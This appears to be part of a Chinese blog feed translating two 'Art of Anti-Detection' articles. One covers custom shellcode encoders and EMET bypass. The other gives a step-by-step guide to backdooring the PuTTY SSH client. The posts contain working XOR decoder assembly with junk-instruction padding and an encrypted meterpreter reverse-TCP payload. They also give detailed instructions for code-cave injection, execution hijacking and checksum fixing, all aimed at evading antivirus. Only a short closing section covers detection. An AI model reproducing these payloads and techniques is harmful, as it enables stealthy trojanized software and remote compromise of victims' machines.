label&#10;SetKey:&#10; POP EDI                  ; Pop the address of decipher key to EDI register&#10; XOR EDX,EDX              ; Zero out the EDX register&#10;Decipher: &#10; MOV AL,[ESI]             ; Move 1 byte from shellcode to AL register&#10; MOV BL,[EDI]             ; Move 1 byte from decipher key to BL register&#10; XOR AL,BL                ; Make a logical XOR operation between AL ^ BL&#10; MOV [ESI],AL             ; Move back the deciphered shellcode byte to same index&#10; INC ESI                  ; Increase the shellcode index&#10; INC EDI                  ; Increase the key index&#10; INC ECX                  ; Increase the shellcode index counter&#10; INC EDX                  ; Increase the key index counter&#10; CMP ECX, End             ; Compare the shellcode index counter with shellcode size &#10; JE Fin                   ; If index counter is equal to shellcode size, jump to Fin label&#10; CMP EDX,KeyEnd           ; Compare the key index counter with key size &#10; JE GetKey                ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10; JMP Decipher             ; Repeate all operations&#10;Fin:                      ; In here deciphering operation is finished&#10; RET                      ; Execute the shellcode&#10;GetShellcode:&#10; CALL Stub                ; Jump to Stub label and push the address of shellcode to stack&#10; Shellcode: DB &#60;Shellcode&#62;&#10;&#10; End: EQU $-Shellcode     ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>由于代码几乎是自解释的，因此我不会浪费时间逐行解释它，使用JMP / CALL技巧可以在运行时获取shellcode和密钥的地址，然后使用shellcode的每个字节与密钥的每个字节做xor运算，每次解密密钥到达结尾时，它将重头开始使用密钥，完成解码操作后，它将跳转到shellcode，使用更长的XOR密钥会增加shellcode的随机性，还会增加代码块的熵，因此避免使用太长的解密密钥，有数百种方法使用基本逻辑运算（例如XOR，NOT，ADD，SUB，ROR，ROL）对shellcode进行编码，在每个编码器例程中都有无限可能的shellcode输出，可能反病毒产品在解码shellcode之前检测外壳代码的签名非常低，因为某些反病毒产品还开发了启发式引擎，能够检测代码块内的解密和解码循环。在编写shellcode编码器时，这里还有几种方法可以绕过针对shellcode编码器的静态检测，<br><br>### 不常见的寄存器用法<br><br>在x86体系结构中，所有寄存器都有特定的用途，例如ECX代表扩展计数器寄存器，它通常用作循环计数器，当我们以任何编译语言编写基本循环条件时，编译器可能会使用ECX寄存器作为循环计数器。循环计数器变量，启发式引擎在代码块中找到连续增加的ECX寄存器强烈表明存在循环，此问题的解决方案很简单，不将ECX寄存器用于循环计数器，这只是一个示例，但它也非常对于所有其他类型的代码片段（如函数结尾/序言等）有效。很多代码识别机制取决于寄存器使用情况，用非常用的寄存器使用方式编写汇编代码会降低检测率。<br><br>### 垃圾代码填充<br><br>可能有数百种方法来识别代码块内的解码器，并且几乎每个反病毒产品都使用不同的方法，但是最终它们必须生成一个签名。在解码器代码内随机使用NOP指令是一个很好的方法绕过基于签名的静态检测，也可以使用其他任何不影响程序原始功能的指令指令替代NOP指令，其目的是添加垃圾指令以分解代码块内的恶意签名，另一个编写shellcode的重要之处在于大小，因此请避免在解码器内部使用过多的垃圾混淆代码，否则会增加整体大小。<br>实施此方法后，结果代码如下所示：<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#==============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode   |&#10;;&#9;|EDI -&#62; Pointer to key         |&#10;;&#9;|EAX -&#62; Shellcode index counter|&#10;;&#9;|EDX -&#62; Key index counter      |&#10;;&#9;|CL  -&#62; Shellcode byte holder  |&#10;;&#9;|BL  -&#62; Key byte holder        |&#10;;&#9;#==============================#&#10;;&#10;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10;    JMP GetShellcode                ; Jump to shellcode label&#10;Stub:       &#10;    POP ESI                         ; Pop out the address of shellcode to ESI register        &#10;    PUSH ESI                        ; Save the shellcode address to stack &#10;    XOR EAX,EAX                     ; Zero out the EAX register&#10;GetKey:     &#10;    CALL SetKey                     ; Call the SetKey label&#10;    Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6                 ; Decipher key&#10;    KeyEnd: EQU $-Key               ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10;    POP EDI                         ; Pop the address of decipher key to EDI register&#10;    NOP                             ; [GARBAGE]&#10;    XOR EDX,EDX                     ; Zero out the EDX register&#10;    NOP                             ; [GARBAGE]&#10;Decipher:       &#10;    NOP                             ; [GARBAGE]&#10;    MOV CL,[ESI]                    ; Move 1 byte from shellcode to CL register&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV BL,[EDI]                    ; Move 1 byte from decipher key to BL register&#10;    NOP                             ; [GARBAGE]&#10;    XOR CL,BL                       ; Make a logical XOR operation between CL ^ BL&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV [ESI],CL                    ; Move back the deciphered shellcode byte to same index&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    INC ESI                         ; Increase the shellcode index&#10;    INC EDI                         ; Increase the key index&#10;    INC EAX                         ; Increase the shellcode index counter&#10;    INC EDX                         ; Increase the key index counter&#10;    CMP EAX, End                    ; Compare the shellcode index counter with shellcode size &#10;    JE Fin                          ; If index counter is equal to shellcode size, jump to Fin label&#10;    CMP EDX,KeyEnd                  ; Compare the key index counter with key size &#10;    JE GetKey                       ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10;    JMP Decipher                    ; Repeate all operations&#10;Fin: ; In here deciphering operation is finished&#10;    RET                             ; Execute the shellcode&#10;GetShellcode:&#10;    CALL Stub                       ; Jump to Stub label and push the address of shellcode to stack&#10;    Shellcode: DB  0x84, 0x73, 0x47, 0xb9, 0x7f, 0x77, 0x59, 0xd5, 0xaa, 0x97, 0xb8, 0xff,&#10;  0x4e, 0xe9, 0x4f, 0xfc, 0x6b, 0x50, 0xc4, 0xf4, 0x6c, 0x10, 0xb7, 0x91,&#10;  0x70, 0xc0, 0x73, 0x7a, 0x7e, 0x59, 0xd4, 0xa7, 0xa4, 0xc5, 0x7d, 0x5b,&#10;  0x19, 0x9d, 0x80, 0xab, 0x79, 0x5c, 0x27, 0x4b, 0x2d, 0x20, 0xb2, 0x0e,&#10;  0x5f, 0x2d, 0x32, 0xa7, 0x4e, 0xf5, 0x6e, 0x0f, 0xda, 0x14, 0x4e, 0x77,&#10;  0x29, 0x10, 0x9c, 0x99, 0x7e, 0xa4, 0xb2, 0x15, 0x57, 0x45, 0x42, 0xd2,&#10;  0x4e, 0x8d, 0xf4, 0x76, 0xef, 0x6d, 0xb0, 0x0a, 0xb9, 0x54, 0xc8, 0xb8,&#10;  0xb8, 0x4f, 0xd9, 0x29, 0xb9, 0xa5, 0x05, 0x63, 0xfe, 0xc4, 0x5b, 0x02,&#10;  0xdd, 0x04, 0xc4, 0xfe, 0x5c, 0x9a, 0x16, 0xdf, 0xf4, 0x7b, 0x72, 0xd7,&#10;  0x17, 0xba, 0x79, 0x48, 0x4e, 0xbd, 0xf4, 0x76, 0xe9, 0xd5, 0x0b, 0x82,&#10;  0x5c, 0xc0, 0x9e, 0xd8, 0x26, 0x2d, 0x68, 0xa3, 0xaf, 0xf9, 0x27, 0xc1,&#10;  0x4e, 0xab, 0x94, 0xfa, 0x64, 0x34, 0x7c, 0x94, 0x78, 0x9b, 0xad, 0xce,&#10;  0x0c, 0x45, 0x66, 0x08, 0x27, 0xea, 0x0f, 0xbd, 0xc2, 0x46, 0xaa, 0xcf,&#10;  0xa9, 0x5d, 0x4f, 0xa6, 0x51, 0x5f, 0x91, 0xe9, 0x17, 0x5e, 0xb9, 0x37,&#10;  0x4f, 0x59, 0xad, 0xf1, 0xc0, 0xd1, 0xbf, 0xdf, 0x3b, 0x47, 0x27, 0xa4,&#10;  0x78, 0x8a, 0x99, 0x30, 0x99, 0x27, 0x69, 0x0c, 0x1f, 0xe6, 0x28, 0xdb,&#10;  0x95, 0xd1, 0x95, 0x78, 0xe6, 0xbc, 0xb0, 0x73, 0xef, 0xf1, 0xd5, 0xef,&#10;  0x28, 0x1f, 0xa0, 0xf9, 0x3b, 0xc7, 0x87, 0x4e, 0x40, 0x79, 0x0b, 0x7b,&#10;  0xc6, 0x12, 0x47, 0xd3, 0x94, 0xf3, 0x35, 0x0c, 0xdd, 0x21, 0xc6, 0x89,&#10;  0x25, 0xa6, 0x12, 0x9f, 0x93, 0xee, 0x17, 0x75, 0xe0, 0x94, 0x10, 0x59,&#10;  0xad, 0x10, 0xf3, 0xd3, 0x3f, 0x1f, 0x39, 0x4c, 0x4f, 0xa6, 0x2e, 0xf1,&#10;  0xc5, 0xd1, 0x27, 0xd3, 0x6a, 0xb9, 0xb0, 0x73, 0xeb, 0xc8, 0xaf, 0xb9,&#10;  0x29, 0x24, 0x6e, 0x34, 0x4d, 0x7f, 0xb0, 0xc4, 0x3a, 0x6c, 0x7e, 0xb4,&#10;  0x10, 0x9a, 0x3a, 0x48, 0xbb&#10;&#10;&#10;    End: EQU $-Shellcode            ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>唯一的变化是EAX和ECX寄存器之间的变化，现在负责计算shellcode索引的寄存器是EAX，并且每条XOR和MOV指令之间只有几行NOP填充，本教程使用的shellcode是Windowsmeterpreter反向TCP，经过加密带有10字节长的随机XOR密钥的shellcode都放置在解码器中，使用nasm -f bin Decoder.asm命令将解码器组装为二进制格式（不要忘记删除shellcode上的换行符否则nasm会编译失败）。<br>这是对原始Shellcode进行编码之前的反病毒扫描结果，<br><br><div align="center"><br><img src="/img/anti_av3_Shellcode.png" align><br></div>

<p>如您所见，许多反病毒软件都可以识别Shellcode。这是经过编码的shellcode的结果，</p>
<div align="center"><br><img src="/img/anti_av3_EncodedShellcode.png" align><br></div>

<h2 id="0x06_对抗漏洞缓解方案">0x06 对抗漏洞缓解方案</h2><p>当绕过反病毒软件时，有很多成功的方法，但是漏洞​​利用缓解将情况提升到一个全新的水平，微软在2009年发布了<a href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit" target="_blank" rel="external">增强缓解体验工具包（EMET）</a>，它是一种有助于防止漏洞利用的实用程序。在成功开发软件方面，它具有多种保护机制，</p>
<ul>
<li>动态数据执行保护（DEP）</li>
<li>结构异常处理程序覆盖保护（SEHOP）</li>
<li>空页分配</li>
<li>堆喷防护</li>
<li>导出地址表地址过滤（EAF）</li>
<li>强制性ASLR</li>
<li>导出地址表访问过滤增强版（EAF +）</li>
<li>缓解ROP<ul>
<li>加载库检查</li>
<li>内存保护检查</li>
<li>调用方检查</li>
<li>模拟执行流程</li>
<li>Stack pivot</li>
</ul>
</li>
<li>减少攻击面（ASR）</li>
</ul>
<p>在这些缓解措施中，EAF，EAF +和调用方检查是我们最关注的问题，如前所述，metasploit框架中的几乎所有shellcode都使用Stephen Fewer的Hash API，并且由于Hash API应用了PEB/EAT解析技术，因此EMET可以轻松检测并阻止执行shellcode。</p>
<h2 id="0x07_绕过EMET">0x07 绕过EMET</h2><p>调用方检查EMET内部以检查由进程进行的Windows API调用，它阻止Win API函数中的RET和JMP指令，以防止在找到所需的Win API之后在Hash API中使用所有使用面向返回的编程（ROP）方法的漏洞利用函数地址使用JMP指令执行函数，不幸的是这将触发EMET调用者检查，为了绕过调用者检查，应避免使用指向Win API函数的JMP和RET指令，而应替换用于执行的JMP指令带有CALL的Win API函数，Hash API应该通过调用方检查，但是当我们查看EAF、EAF+缓解技术时，它们会阻止访问导出地址表（EAT）进行读/写访问，具体取决于所调用的代码，并检查栈寄存器是否在允许的范围内，并尝试检测对某些DLL如KERNELBASE的MZ/PE头的访问，这是一种用于防止EAT解析技术的非常有效的缓解方法，但是EAT并不是唯一包含所需函数地址的结构，如果应用程序使用了，则导入地址表（IAT）还将保存应用程序使用的Win API函数地址还在使用所需的功能时，可以在IAT结构中收集功能地址，一位名叫Joshua Pitts的网络安全研究人员最近开发了一种新的IAT解析方法，它在导入地址表中找到了LoadLibraryA和GetProcAddress Windows API函数，在获取这些函数地址后，可以从任何库中提取任何函数，他还编写了一个名为fido的工具，用于剥离Stephen Fewer的Hash API并替换为他编写的IAT解析代码，如果您想在阅读有关此方法的更多信息请点击<a href="https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf" target="_blank" rel="external">这</a>.</p>
<h2 id="参考">参考</h2><ul>
<li><a href="https://msdn.microsoft.com/en-us/library/ms809762.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms809762.aspx</a></li>
<li><a href="https://en.wikipedia.org/wiki/Process_Environment_Block" target="_blank" rel="external">https://en.wikipedia.org/wiki/Process_Environment_Block</a></li>
<li><a href="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003" target="_blank" rel="external">https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003</a></li>
<li><a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="external">https://en.wikipedia.org/wiki/Portable_Executable</a></li>
<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="external">https://en.wikipedia.org/wiki/X86_calling_conventions</a></li>
<li><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">http://www.vividmachines.com/shellcode/shellcode.html</a></li>
<li><a href="https://github.com/secretsquirrel/fido" target="_blank" rel="external">https://github.com/secretsquirrel/fido</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></li>
<li><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="external">The Shellcoder’s Handbook: Discovering and Exploiting Security Holes</a></li>
<li><a href="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059" target="_blank" rel="external">Sockets, Shellcode, Porting, and Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals</a></li>
</ul>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/</a></em></p>
</key></shellcode>]]></content>
    <summary type="html">
    <![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术2-如何制作PE文件后门（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/"/>
    <id>http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/</id>
    <published>2020-09-04T11:39:22.000Z</published>
    <updated>2021-03-16T15:19:39.846Z</updated>
    <content type="html"><![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>现在，几乎所有安全研究人员，测试人员和恶意软件分析师在日常工作中都会处理后门，维持后门访问权限最流行的方式是将后门安装到系统或某个软件中。本文的大部分内容是如何在32位PE文件中植入后门的方法，但是由于PE文件格式是Unix COFF（通用对象文件格式）的修改版本，因此这些方法也可以移植用于所有其他可执行二进制文件文件类型。植入后门的隐蔽性对在系统中停留更长的时间非常重要，因此本文介绍的方法都会尽量减少被反病毒软件检出的概率。在继续阅读本文之前，请先阅读第一篇文章<a href="http://www.youngroe.com/art-of-anti-detection-1-introduction-to-av-detection-techniques">反检测的艺术1-反病毒软件及检测技术概述</a>，这对于理解反病毒产品的内部工作原理和有关反检测的基本思路将非常有帮助。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="红队渗透测试">红队渗透测试</h3><p>在网络安全领域，红队是一群白帽黑客，他们像攻击者一样攻击组织的网络基础架构，目的是测试（通常称为渗透测试）组织的防御能力。包括Microsoft在内的公司会定期组织红蓝两队进行渗透测试。组织红蓝两队的渗透测试体现了以攻促防的安全理念，可以快速发现网络安全问题并及早解决。</p>
<h3 id="地址空间布局随机化">地址空间布局随机化</h3><p>（ASLR）是一种计算机安全技术，主要用于防止缓冲区溢出攻击。防止攻击者精确的跳转到内存中的某个特定漏洞地址空间地址实现漏洞利用，ASLR随机布局进程内存的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈，堆和相关库的地址。</p>
<h3 id="Code_Caves">Code Caves</h3><p>Code Caves是一个程序写入另一个进程的内存的一段代码。这段代码可以通过在目标进程内创建远程线程来执行。代码的Code Caves通常是对代码的脚本函数的一部分的引用，该脚本函数具有注入自定义指令的能力。例如，如果脚本的内存允许5个字节，并且只使用3个字节，则剩余的2个字节可以用于向脚本添加外部代码, 这就是所谓的code cave。</p>
<h3 id="校验和">校验和</h3><p>校验和是对一段数据进行计算得到的一段小尺寸的数据，目的是检测可能在传输或存储过程中引入的错误。通常应用于安装文件从下载服务器收到安装文件的场景。就其本身而言，校验和通常用于验证数据完整性，但并不依赖于校验和来验证数据的真实性。</p>
<h2 id="0x02_主要方法">0x02 主要方法</h2><p>本文所有实现和示例都将使用putty SSH客户端实现。选择putty作为后门实践的宿主原因有很多，其中之一是putty是一个使用多个库和Windows API原生的C++客户端，另一个原因是使用SSH客户端作为后门将很难被注意到，因为putty客户端本身需要使用tcp连接。可以避免被蓝队网络监控发现，使用的后门代码是metasploit项目中Stephen Fever的反向TCP meterpreter shellcode。主要目标是将meterpreter shellcode注入目标PE文件，同时不破坏程序的实际功能。注入的shellcode将在新线程上执行，并将尝试持续连接到服务端。在执行所有这些操作时，另一个目标是使检测分数保持尽可能低的水平。<br>在PE文件中植入后门的常用方法包括4个主要步骤。</p>
<ul>
<li>1）为后门代码寻找可用空间</li>
<li>2）劫持程序执行流程</li>
<li>3）注入后门代码</li>
<li>4）恢复执行流程<br>在每个步骤中，都有很多细节的关键东西，这些细节保证了后门的隐蔽性防止被检测。</li>
</ul>
<h3 id="可用空间问题">可用空间问题</h3><p>第一步需要找到一块可用的空间，在PE文件中找到合适空间插入后门代码非常重要，被插入后门后的PE文件威胁检测分数很大程序上取决于如何在可用空间插入后门代码，一般有两种方式解决空间空间问题：</p>
<h4 id="1）添加一个新的section">1）添加一个新的section</h4><p>与另一种方法相比，此方法在检测分数上有更多缺点，但是通过添加一个新的section，对将要植入的后门代码没有大小限制。<br>通过使用反汇编工具或如LordPE的PE编辑器，可以通过添加新的section header来增加所有PE文件大小，下面是putty可执行文件的节表，通过PE编辑器，增加一个名称为NewSec大小为1000字节新section。</p>
<div align="center"><br><img src="/img/anti_av2_putty_sections.png" align><br></div>

<p>创建新section时，必须将section flags设置为”Read/Write/Execute”，否则PE文件被映射到内存后shellcode不能正常运行。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>添加节头后，需要调整文件大小，可以使用十六进制编辑器在文件末尾添加section大小的空字节实现。</p>
<div align="center"><br><img src="/img/anti_av2_sectionflags.png" align><br></div>

<p>完成上述操作后，建议运行添加新section后的可执行问价你，以防出现任何错误，如果可执行文件运行顺利，则可以在调试器上修改新section。</p>
<div align="center"><br><img src="/img/anti_av2_newsec.png" align><br></div>

<p>通过添加新section来解决空间问题，在反检测分数上几乎没有任何优势，几乎所有的反病毒软件都可以识别不常见的section，而对不常见的section赋予所有（Read/Write/Execute）权限肯定是非常可疑的。<br>即使在putty可执行文件中添加一个空的完整权限section，某些反病毒软件也会将其标记为恶意。</p>
<div align="center"><br><img src="/img/anti_av2_VirusTotal.png" align><br></div>

<h4 id="2）Code_Caves">2）Code Caves</h4><p>解决空间问题的第二种方法是使用目标可执行文件的Code Caves。几乎所有编译的二进制文件都有可以用于插入后门代码的Code Caves。由于使用原始PE可执行文件空间，使用Code Caves代替增加section有助于减小被反病毒产品判定为恶意代码的风险。而且PE文件的大小在后门程序结束时不会更改，但是这种方法也有一些缺点。<br>Code Caves的数量和大小因文件而异，但是与添加新节相比，通常没有太多空间。使用Code Caves时，应尽量减少后门代码的尺寸。另一个缺点是section flag，由于应用程序的执行流程将劫持到到Code Caves，因此包含Code Caves的部分应具有Execute权限，为了修改section中的代码需要write权限，即使使某些shellcode是以自修改方式编码或混淆的。<br>多个Code Caves的使用将有助于解决空间限制问题，同时将后门代码拆分为多个片段有助于减少检测分数，但不幸的是，更改段权限看起来依然很可疑。有高级方法可以在运行时修改内存区域权限，以避免直接更改section flag，但是由于这些方法需要定制的shellcode，编码和IAT解析技术，因此将在下一篇文章中讨论。<br>借助名为Cminer的工具，可以很容易地枚举二进制文件的所有Code Caves。使用./Cminer putty.exe 300命令，可以枚举大于300字节的Code Caves。</p>
<div align="center"><br><img src="/img/anti_av2_cminer1.png" align><br></div>

<p>在本例中有5个比较好的Code Caves。start address给出了Code Caves的虚拟内存地址（VMA）。这是PE文件加载到内存中时Code Caves的地址，file offest是以字节为单位的PE文件形式Code Caves的位置起始地址。</p>
<div align="center"><br><img src="/img/anti_av2_cminer2.png" align><br></div>

<p>似乎大多数Code Caves都在data section，但data部分没有execute section flag，因此需要进行更改。后门代码大约为400-500字节，因此第5个Code Caves应该绰绰有余。应将所选Code Caves的起始地址保存下来，将section flag更改为R/W/E，后门程序的第一步将完成了，现在该劫持代码执行流程了。</p>
<h3 id="劫持执行流程">劫持执行流程</h3><p>在本小结中，目标是通过修改目标可执行文件中的指令将执行流重定向到后门代码。关于如何选择要修改的指令，有一个重要的细节。所有二进制指令的大小均以字节为单位，为了跳转到后门代码地址，将使用5或6个字节的长跳转。因此，在patch二进制文件时，要修改的指令必须与长跳转指令具有相同的大小，否则被修改位置上一条或下一条指令将被破坏。<br>选择正确的位置来重定向执行对于绕过反病毒软件的动态和沙箱分析非常重要。如果直接重定向，则可能会被反病毒软件的动态分析阶段检测到重定向。</p>
<p><strong>通过用户交互隐藏</strong>：<br>绕过沙箱/动态分析首先想到的是延迟Shellcode的执行或设计可识别沙箱的Shellcode和触发机制。但在插入后门代码时，大多数时候没有太多空间可以在PE文件中添加这些额外的代码。此外，通过汇编级语言编写反检测机制也需要大量时间和专业的知识。<br>利用需要用户交互才能执行后门代码，只有在实际用户操作程序时，通过用户交互才重定向执行后门代码。如果可以正确实现此方法，则成功率将为%100，并且不会增加后门代码的大小。<br>Putty可执行UI上的“Open”按钮启动一个功能，该功能实际检查给定IP地址的有效性。</p>
<div align="center"><br><img src="/img/anti_av2_putty.png" align><br></div>

<p>如果IP地址字段值不为空且有效，它将启动连接功能尝试连接给定的IP地址。<br>如果客户端成功创建SSH会话，则会弹出一个新窗口并要求提供凭据。</p>
<div align="center"><br><img src="/img/anti_av2_puttyLogin.png" align><br></div><br>这将是发生重定向的关键，因为没有足够的反病毒产品能够克隆这种复杂的操作手法，因此不会通过沙箱和动态分析机制检测到植入的后门。<br>使用基础的逆向工程方法，例如跟随字符串和字符串引用，将不难找到connect函数的地址。客户端与给定IP建立连接后，将在显示的窗口中显示一个字符串”login as：”。该字符串将帮助我们找到connect函数的地址，IDA Pro在查找字符串引用方面做得很好。<br>为了找到 “login as:”字符串，可以通过在IDA中点击Views-&gt;Open Subviews-&gt;Strings。<br><br><div align="center"><br><img src="/img/anti_av2_idastring.png" align><br></div><br>找到字符串并双击后，IDA会在数据部分内部找到为字符串创建的所有交叉引用，按Ctrl + X将显示所有交叉引用，在函数中引用字符串并显现“login as:”字符串。<br><div align="center"><br><img src="/img/anti_av2_Screenshot_2.png" align><br></div>

<div align="center"><br><img src="/img/anti_av2_Screenshot_3.png" align><br></div>

<p>这就是要patch的指令，在进行任何更改之前，请备份该指令。在后门代码执行后，将再次使用它。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_4.png" align><br></div><br>将PUSH 467C7C指令更改为JMP 0x47A478的后门程序的重定向已完成。请注意下一条指令地址，这一点很重要。执行后门代码后，它将用作返回地址。下一步将注入后门代码。<br><br>### 注入后门代码<br><br>在注入后门代码时，首先需要做的是在执行后门之前保存寄存器。所有寄存器中的每个值对于程序的执行都非常重要。通过在Code Caves的开头放置PUSHAD和PUSHFD指令，所有寄存器和寄存器标志都存储栈中。这些值将在执行后门代码后弹出，因此程序可以继续执行而不会出现任何问题。<br><br><div align="center"><br><img src="/img/anti_av2_savereg.png" align><br></div>

<p>如前所述，将使用的后门代码是metasploit项目中的meterpreter反向TCP Shell代码。但是shellcode几乎不需要更改。通常反向TCP Shellcode会尝试连接给定次数，如果连接失败，它将通过调用ExitProcess API调用来关闭进程。</p>
<div align="center"><br><img src="/img/anti_av2_dmet.png" align><br></div>

<p>问题是，如果到处理程序的连接失败，则putty客户端的执行将停止，现在修改每次连接失败时shellcode程序集的几行，shellcode就会重试连接到原始程序，并且shellcode的大小也会减小。</p>
<div align="center"><br><img src="/img/anti_av2_nmet.png" align><br></div>

<p>在汇编代码中进行必要的修改后，使用nasm -f bin stager_reverse_tcp_nx.asm命令对其进行编译。现在，可以使用反向TCP Shellcode，但不能直接使用它。目标是在新线程上执行shellcode。为了创建一个新的线程，需要有另一个shellcode进行CreateThread的API调用，该调用指向反向TCP shellcode。在Stephen Fever编写的metasploit项目中还有一个用于创建线程的shellcode，</p>
<div align="center"><br><img src="/img/anti_av2_CreateThread.png" align><br></div>

<p>将shellcode字节以十六进制格式放置在createthread.asm文件中后，即可使用nasm -f bin createthread.asm命令进行汇编。此时，可以将Shellcode插入到code cave中了，但是在插入Shellcode之前，应该对它进行编码，以绕过反病毒产品的静态/签名分析机制。由于大多数反病毒软件都能识别metasploit项目中的所有编码器，因此强烈建议使用自定义编码器。本文将不讨论这种自定义shellcode编码器的制作方法，因为这将是另一篇文章的主题，但是使用多个metasploit编码器也可能会起作用。在每个编码过程之后，建议以原始格式将编码的shellcode上传到virus total并检查检测分数。尝试每种组合，直到无法检测到为止，或者等待下一篇文章。<br>在对shellcode进行正确编码之后，是时候将其插入到code cave中了。选择PUSHFD下的指令，然后在调试器上按Ctrl + E，shellcode将以十六进制格式粘贴到此处。</p>
<div align="center"><br><img src="/img/anti_av2_Insert.png" align><br></div>

<p>使用xxd -ps createthread命令，以十六进制格式打印编码的createthread shellcode或使用十六进制编辑器打开shellcode并复制十六进制值。在将十六进制值粘贴到immunity 调试器时，请注意字节数限制，这些patch操作是使用immunity 调试器进行的，而immunity 调试器在粘贴以编辑代码窗口时具有字节数限制。它不会粘贴所有的shellcode，记住在“编辑代码”窗口中粘贴的shellcode的最后2个字节，在按下OK按钮之后，继续将字节粘贴到它们结束的位置，当所有的shellcode粘贴到代码中后，插入后门代码操作就做完了。</p>
<h3 id="恢复执行流程">恢复执行流程</h3><p>创建后门代码线程后，程序需要返回到原始程序执行流程执行，这意味着EIP应该跳回到将执行重定向到插入后门代码功能位置。但是在跳回该功能之前，应先恢复所有已保存的寄存器。</p>
<div align="center"><br><img src="/img/anti_av2_pop.png" align><br></div>

<p>通过在shellcode的末尾插入POPFD和POPAD指令，所有保存的寄存器都以相同的顺序从栈中弹出。弹出寄存器后，在跳回之前还需要再做一个思考。之前为了执行被劫持指令，将PUSH 467C7C指令替换为JMP 0x47A478，以便将程序的执行重定向到code cave。现在，需要将PUSH 467C7C指令放在最后，才能恢复被劫持的指令。最后通过插入JMP 0x41CB73指令将执行重定向到code cave的函数了，最后生成的代码应如下所示</p>
<div align="center"><br><img src="/img/anti_av2_end.png" align><br></div>

<p>最后，选择所有patch和插入的指令，按右键单击并复制到可执行文件。应该对已修改的每条指令执行此操作。将所有指令复制并保存到文件后，请关闭调试器并测试可执行文件，如果可执行文件运行顺利，则后门即可使用。<br>最后，建议修改最终文件的校验和，以保持文件的真实性而不显得可疑，这也可能会降低检测分数。</p>
<div align="center"><br><img src="/img/anti_av2_Screenshot_6.png" align><br></div>

<h2 id="0x03_结论与预防措施">0x03 结论与预防措施</h2><p>最后，当正确应用上述步骤后，可生成完全无法检测后门。针对以上的两种代码注入方式，下面给出这些相应技术的对策，这些策略可以帮助系统管理员、恶意软件记录器、反病毒与反恶意软件产品的开发人员。</p>
<h3 id="1）section权限检查">1）section权限检查</h3><p>在谈到后门文件时，section权限flag对于检测异常非常重要，除非编译器愿意，否则当前的编译器绝不会为该节设置完整权限，尤其是像.data或.rdata这样的数据节不应如此具有执行权限，例如.text之类的代码段也不应具有写权限，这些异常应被视为可疑行为。</p>
